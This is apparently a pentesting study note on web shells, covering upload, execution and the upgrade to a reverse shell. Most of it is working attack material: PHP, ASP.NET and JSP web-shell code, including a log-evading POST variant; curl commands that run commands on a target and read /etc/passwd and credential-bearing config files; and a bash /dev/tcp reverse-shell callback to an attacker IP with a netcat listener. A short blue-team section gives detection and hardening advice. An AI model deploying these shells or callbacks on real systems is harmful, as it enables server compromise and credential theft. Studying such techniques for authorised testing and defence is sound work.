#webapplications

A **web shell** is a small server-side script that takes a command from an HTTP parameter, runs it on the OS, and returns the output. It's the usual payoff once you can write an executable file into the web root — see [[File Upload Vulnerabilities]] for how the file gets there, and [[Command Injection]] / [[Local File Inclusion]] for other ways code ends up running.

The minimal PHP one, saved as `shell.phtml`:
```php
<?php
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```
`<pre>` keeps command output readable in the browser. The extension matters as much as the content: when `.php` is filtered, Apache will often still execute `.phtml`, `.php5`, `.php7`, `.phar`, or `.pht` (depends on the `AddHandler`/`AddType` config). The extension only has to be one the server maps to the PHP handler.

## One-liners by language
| Stack | Web shell |
| --- | --- |
| PHP | `<?php echo shell_exec($_GET['cmd']); ?>` (or `system()`, `passthru()`, backticks) |
| PHP (POST, stealthier) | `<?php echo shell_exec($_POST['c']); ?>` — command is in the body, not the URL/logs |
| ASP.NET | `<% Response.Write(new ActiveXObject("WScript.Shell").Exec(Request["cmd"]).StdOut.ReadAll()); %>` |
| JSP | `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>` |

## Driving it with curl
Code runs as the web server account (`www-data` on Debian/Ubuntu Apache, `apache`/`nginx` elsewhere), so start by confirming RCE and fingerprinting the host:
```bash
curl "http://TARGET/uploads/shell.phtml?cmd=id"
curl "http://TARGET/uploads/shell.phtml?cmd=whoami"
curl "http://TARGET/uploads/shell.phtml?cmd=hostname"
curl "http://TARGET/uploads/shell.phtml?cmd=uname+-a"
```
**URL-encode the command** — the browser/curl otherwise eats spaces and special chars. `+` or `%20` for space, `%26` for `&`, `%3B` for `;`, `%7C` for `|`. Wrap multi-word commands in single quotes so your shell doesn't split them before curl sends them.

First-look enumeration once you have execution:
```bash
?cmd=cat+/etc/passwd          # local accounts (grep -v nologin for real shells)
?cmd=sudo+-l                  # anything runnable without a password
?cmd=cat+/var/www/html/config.php   # DB creds, API keys — common lateral/priv-esc path
?cmd=find+/+-perm+-4000+2>/dev/null # SUID binaries
```

## Why you upgrade off it — and how
A web shell is fine for a few commands but painful to live in: every command is a fresh stateless HTTP request (no working directory, no environment persists), there's no TTY, and interactive tools (`su`, `ssh`, `vim`, `passwd`) won't work. Upgrade to a reverse shell as soon as you've confirmed RCE.

Listener first, on your box:
```bash
nc -lvnp 4444
```
Then fire the callback through the web shell. URL-encode the whole payload — note `%26` for each `&`:
```bash
curl "http://TARGET/uploads/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261'"
```
Payloads, nc/bash/python variants, and TTY stabilisation (`python3 -c 'import pty; pty.spawn("/bin/bash")'`, `stty raw -echo; fg`) all live in [[Reverse Shells]].

## Blue-team notes
- **Where it lands** — world-writable or upload directories under the web root (`/var/www/html/uploads/`, document/attachment stores). Uploads belong *outside* the web root, served with `Content-Disposition: attachment`; see the defence section of [[File Upload Vulnerabilities]].
- **Detection** — scripts with dynamic callbacks (`eval`, `system`, `shell_exec`, `base64_decode`, `assert`) in a content/upload path; unexpected `.phtml`/`.php*` files by mtime; `www-data` spawning `bash`/`nc`/`python` or making outbound connections (reverse-shell callback).
- **Containment** — run the app as an unprivileged account, `noexec` on upload mounts, disable dangerous PHP functions via `disable_functions`, and deny script execution in upload dirs (`php_admin_flag engine off`, or an nginx location that never passes them to the interpreter).
